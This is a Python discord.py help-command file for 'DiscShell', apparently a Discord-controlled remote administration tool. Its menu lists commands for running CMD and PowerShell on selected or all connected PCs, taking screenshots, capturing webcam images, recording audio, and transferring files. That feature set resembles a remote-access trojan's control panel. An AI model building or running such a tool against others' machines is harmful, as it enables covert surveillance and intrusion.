import discord
from discord import app_commands
from discord.ext import commands

class Help(commands.Cog):
    def __init__(self, app: commands.Bot):
        self.bot = app

    @app_commands.command(name="help", description="Show DiscShell Manual")
    async def help(self, interaction: discord.Interaction):
        
        embed = discord.Embed(
            title="DiscShell Control Manual",
            description="List of commands for remote PC management.",
            color=discord.Color.blue()
        )

        embed.add_field(
            name="Session Management",
            value=(
                "`!list` : Show connected PCs & status\n"
                "`!select [ID]` : Activate a specific PC\n"
                "`!select all` : Activate ALL PCs\n"
                "`!unselect [ID]` : Disconnect a specific PC (Switch to Standby)\n"
                "`!unselect all` : Disconnect ALL PCs (Switch to Standby)"
            ),
            inline=False
        )

        embed.add_field(
            name="System Informations",
            value=(
                "`!sysinfo ([ID])` : Show CPU, RAM, Disk, Uptime info"            
                ),
            inline=False
        )

        embed.add_field(
            name="CMD Execution",
            value=(
                "`!cmd [command]` : Execute on SELECTED PC\n"
                "`!run [ID] [command]` : Execute on TARGET PC immediately"
            ),
            inline=False
        )

        embed.add_field(
            name="PowerShell Execution",
            value=(
                "`!ps [command]` : Execute on SELECTED PC\n"
                "`!psrun [ID] [command]` : Execute on TARGET PC immediately"
            ),
            inline=False
        )

        embed.add_field(
            name="Observer Execution",
            value=(
                "`!screenshot ([ID])`: Capture Screen (Selected PC or Target PC)\n"
                "`!webcam [num]`: Capture Webcam [Selected PC or Target PC (Default: #1)]\n"
                "`!camlist ([ID]) [num]`: List connected webcams (Scan 'num' slots)\n"
                "`!listen ([ID]) [sec]`: Record Audio"
            ),
            inline=False
        )

        embed.add_field(
            name="File Operations",
            value=(
                "`!download ([ID]) [path]` : Download file from PC\n"
                "`!upload ([ID]) ([path])` : Upload attached file to PC (Default: Current Dir)"
            ),
            inline=False
        )

        embed.set_footer(
            text=f"Requested by {interaction.user.display_name}", 
            icon_url=interaction.user.display_avatar.url
        )

        await interaction.response.send_message(embed=embed)


async def setup(app: commands.Bot):
    await app.add_cog(Help(app))